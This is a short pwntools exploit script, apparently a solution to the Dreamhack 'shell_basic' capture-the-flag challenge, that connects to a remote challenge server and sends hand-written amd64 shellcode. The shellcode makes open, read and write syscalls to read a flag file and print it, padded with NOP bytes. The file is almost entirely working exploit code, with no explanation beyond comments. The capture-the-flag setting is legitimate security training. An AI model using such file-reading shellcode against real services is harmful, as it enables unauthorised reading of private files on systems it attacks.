from pwn import *
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('./release/shell_basic')
else:
    r = remote('host3.dreamhack.games', 23569)

flag_filename = b'/home/shell_basic/flag_name_is_loooooong'

# open(flag_filename, 0, 0)
shellcode = '''
lea rdi, [rip + 0x4f9]
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall
'''

# read(flag_fd, buf, 0x100)
shellcode += '''
mov rsi, rdi
mov rdi, rax
mov rdx, 0x100
xor rax, rax
syscall
'''

# write(1, buf, 0x100)
shellcode += '''
mov rdi, 1
mov rax, 1
syscall
'''

shellcode = asm(shellcode).ljust(0x500, b'\x90') + flag_filename

r.sendafter('shellcode: ', shellcode)

r.interactive()